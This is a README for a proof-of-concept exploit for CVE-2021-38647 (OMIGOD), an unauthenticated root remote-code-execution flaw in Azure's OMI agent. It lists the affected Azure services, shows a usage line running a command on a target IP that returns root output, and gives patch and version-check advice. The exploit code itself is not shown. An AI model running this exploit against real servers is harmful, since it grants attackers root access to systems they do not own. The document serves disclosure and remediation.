# OMIGOD
Proof on Concept Exploit for CVE-2021-38647 (OMIGOD)

## Details
CVE-2021-38647 is an unauthenticated RCE vulnerability effecting the OMI agent as root.

OMI agents are commonly found installed in Azure Linux servers when the following are in use:
* Azure Automation
* Azure Automatic Update
* Azure Operations Management Suite
* Azure Log Analytics
* Azure Configuration Management
* Azure Diagnostics

## Usage
```bash
azureuser@linux:~$ python3 omigod.py -t 10.0.0.5 -c id
uid=0(root) gid=0(root) groups=0(root)
```

## Example Output
![Proof](proof.png)

## Mitigations
Update and ensure the OMI agent is at version 1.6.8.1.
* For Debian systems (e.g., Ubuntu): `dpkg -l omi`
* For Redhat based system (e.g., Fedora, CentOS, RHEL): `rpm -qa omi`

## Prior Research Credit
For more details see the original researchers' work: 
https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure
